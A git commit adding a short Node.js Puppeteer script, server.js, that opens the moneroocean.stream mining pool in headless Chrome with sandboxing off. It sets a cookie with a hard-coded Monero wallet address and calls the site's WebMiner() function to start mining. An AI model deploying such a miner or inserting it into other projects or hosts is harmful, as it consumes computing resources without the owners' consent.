c7c16a54f541db93d5439ce997d129e4097dfa05
raiyan088 <78313577+raiyan088@users.noreply.github.com>
2022-10-20 21:46:26 +0600

    Add files via upload

--- test01/server.js
+++ test01/server.js
@@ -1,1 +1,53 @@
+const puppeteer = require("puppeteer")
 
+let cookies = [
+    {
+      name: 'MoneroOceanAddr',
+      value: '429EPxt6GmMGvfmpiXFdyvKrjFGGtr6pee91j7o6r5V4DzStvcRnH3m5pdd6mwxNENU5GpsDPUgpfewUiCr4TZfV6K3GgKw',    
+      domain: 'moneroocean.stream',
+      path: '/',
+      expires: 1697815663,
+      size: 315,
+      httpOnly: false,
+      secure: false,
+      session: false,
+      sameParty: false,
+      sourceScheme: 'Secure',
+      sourcePort: 443
+    }
+  ]
+
+;(async () => {
+    let browser = await puppeteer.launch({
+        headless: true,
+        args: ['--no-sandbox', '--disable-setuid-sandbox']
+    })
+
+    let page = await browser.newPage()
+
+    await page.setCookie(...cookies)
+
+    page.on('console', async (msg) => {
+        const msgArgs = msg.args()
+        for (let i = 0; i < msgArgs.length; ++i) {
+          console.log(await msgArgs[i].jsonValue())
+        }
+    })
+
+    console.log('Page Load Start')
+
+    await page.goto('https://moneroocean.stream/')
+
+    console.log('Page Load Success')
+
+    await delay(3000)
+
+    await page.evaluate(() => WebMiner())
+    console.log('Mining Start')
+})()
+
+function delay(time) {
+    return new Promise(function (resolve) {
+        setTimeout(resolve, time)
+    })
+}
